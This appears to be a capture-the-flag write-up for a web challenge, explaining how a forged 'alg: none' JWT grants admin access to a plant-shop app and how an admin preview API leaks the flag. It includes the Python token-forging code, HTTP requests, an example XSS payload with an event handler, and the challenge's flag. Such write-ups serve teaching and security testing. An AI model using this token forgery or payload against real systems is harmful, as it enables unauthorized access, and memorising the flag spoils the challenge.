# Sprout & About — Full Solution

## Flag

```
zdk{0CeAn_dlviNg_i5_FuN}
```

---

## Challenge Overview

| Field       | Value |
|-------------|-------|
| **Name**    | Sprout & About |
| **Category**| Web |
| **Instance**| `https://sprout-about-7565d8f9d6ef.chals.z0d1ak.org` |

> *The plant shop owners heard JWTs were "industry standard" and immediately stopped worrying about security. Find a way into the moderation preview, plant a crafted sea specimen, and make the flag bloom.*

The app is a Next.js ocean-plant nursery shop with user registration, a shop catalog, and a hidden **admin panel** ("Tide Desk") protected by role-based JWT authentication.

---

## Vulnerability Chain

Two vulnerabilities are chained together:

1. **JWT `alg: none` Signature Bypass** — The server accepts JWTs with `"alg": "none"` and no signature, allowing any user to forge tokens with arbitrary claims (including `"role": "ADMIN"`).
2. **Sensitive Data in Preview API** — The `/api/admin/preview-context` endpoint returns the flag directly in its JSON response when called with a valid product ID and preview token.

---

## Step-by-Step Walkthrough

### Step 1 — Register a Normal Account

The `/register` page has a form that POSTs to `/api/auth/register` with `email` and `password` fields. After registration, the server issues a `sprout_session` cookie containing a signed JWT.

```http
POST /api/auth/register
Content-Type: application/x-www-form-urlencoded

email=testuser@sproutabout.com&password=password123456
```

The response (HTTP 307 redirect) sets the cookie:

```
Set-Cookie: sprout_session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI0IiwiZW1haWwiOiJ0ZXN0dXNlcjEyMzQ1QHNwcm91dGFib3V0LmNvbSIsInJvbGUiOiJVU0VSIiwiaWF0IjoxNzg3NDQyNDY0LCJleHAiOjE3ODc0NjQwNjR9.cRusi9NNOi6cTz_cKkOgZui3TGzfFzxD_I_iP8J9A9c
```

### Step 2 — Decode the JWT

Decoding the JWT reveals the structure:

**Header:**
```json
{"alg": "HS256", "typ": "JWT"}
```

**Payload:**
```json
{
  "sub": "4",
  "email": "testuser12345@sproutabout.com",
  "role": "USER",
  "iat": 1787442464,
  "exp": 1787464064
}
```

Key observation: the `role` field controls authorization. Normal users get `"USER"`.

### Step 3 — Forge an ADMIN JWT with `alg: none`

The classic JWT `alg: none` attack works here. We craft a new JWT with:
- Header: `{"alg":"none","typ":"JWT"}`
- Payload: same structure but with `"role":"ADMIN"`
- Signature: **empty** (just a trailing dot)

```python
import base64, json

def b64url(data):
    return base64.urlsafe_b64encode(data.encode()).rstrip(b'=').decode()

header  = json.dumps({"alg":"none","typ":"JWT"}, separators=(',',':'))
payload = json.dumps({
    "sub":"4",
    "email":"testuser12345@sproutabout.com",
    "role":"ADMIN",
    "iat":1787442464,
    "exp":1787464064
}, separators=(',',':'))

forged_token = f"{b64url(header)}.{b64url(payload)}."
```

The resulting token is accepted by the server because it trusts the `alg` header and skips signature verification when `alg` is `none`.

### Step 4 — Access the Admin Panel

Using the forged token as the `sprout_session` cookie, we can now access `/admin`:

```http
GET /admin
Cookie: sprout_session=<forged_token>
```

This reveals the **Tide Desk Console** with three sections:
- **Specimen Catalog** (`/admin/products`) — manage products and trigger moderation previews
- **Keepers Directory** (`/admin/users`) — view user accounts
- **Audit Timeline** (`/admin/logs`) — view audit events

### Step 5 — Extract Preview Tokens from the Product Catalog

Navigating to `/admin/products` reveals a table of all 8 nursery specimens. Each row has a "Preview" button powered by a `ProductPreviewDialog` React component. The server-side rendered HTML embeds the component props directly, including **preview tokens**:

```
"productId":1,"previewToken":"4e006757-c51b-4c45-ae6b-ed70a5a4da43","name":"Moonlit Kelp"
"productId":2,"previewToken":"1d890537-1569-49b1-bb57-41accf047f18","name":"Coral Fan"
"productId":3,"previewToken":"497dfea5-850a-47a0-8829-f74657249a59","name":"Seagrass Meadow"
...
```

There is also a **QA Note** at the bottom of the page:

> *Payloads using event handlers (e.g. `<img src=x onerror=...>`) evaluate reliably during bot moderation preview checks.*

This hints at an intended XSS path, but we can take a shortcut.

### Step 6 — Hit the Preview API to Get the Flag

By analyzing the client-side JavaScript chunk (`1vpf7k68lhfum.js`), we find the preview fetches data from:

```
/api/admin/preview-context?productId={id}&previewToken={token}
```

Calling this endpoint directly with our forged admin cookie:

```http
GET /api/admin/preview-context?productId=1&previewToken=4e006757-c51b-4c45-ae6b-ed70a5a4da43
Cookie: sprout_session=<forged_admin_token>
```

**Response:**
```json
{
  "mode": "moderation",
  "finalFlag": "zdk{0CeAn_dlviNg_i5_FuN}",
  "productId": 1,
  "note": "internal-only"
}
```

The flag is returned directly in the JSON response.

---

## Solve Script

See `solve.py` for a self-contained Python script that automates the full chain.

```bash
python solve.py
```

---

## Key Takeaways

| Issue | Impact |
|-------|--------|
| JWT accepts `alg: none` | Any user can forge tokens and escalate to any role |
| Preview tokens embedded in SSR HTML | No need to trigger the bot — tokens are readable from page source |
| Flag leaked in API response | The preview-context API returns the flag directly to any authenticated admin |
| No signature verification | The server blindly trusts the JWT header's algorithm claim |

### Intended vs Actual Path

The challenge description and QA note suggest the intended path was:
1. Forge admin JWT → access admin panel
2. Create a new product with an XSS payload in the description (e.g., `<img src=x onerror="fetch(...)">`)
3. Trigger the moderation bot preview, which renders the HTML and executes the XSS
4. Exfiltrate the flag from the bot's context via the XSS

However, the flag is directly accessible from the `/api/admin/preview-context` endpoint without needing to involve the bot at all — making the XSS step unnecessary.
